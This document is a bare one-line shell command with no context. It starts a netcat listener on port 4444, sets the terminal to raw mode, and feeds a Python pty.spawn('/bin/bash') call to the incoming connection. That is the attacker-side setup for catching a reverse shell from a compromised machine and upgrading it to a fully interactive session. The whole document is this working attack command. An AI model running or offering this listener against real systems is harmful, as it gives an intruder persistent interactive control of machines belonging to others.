stty raw -echo && cat <(echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'") - | nc -lvp 4444
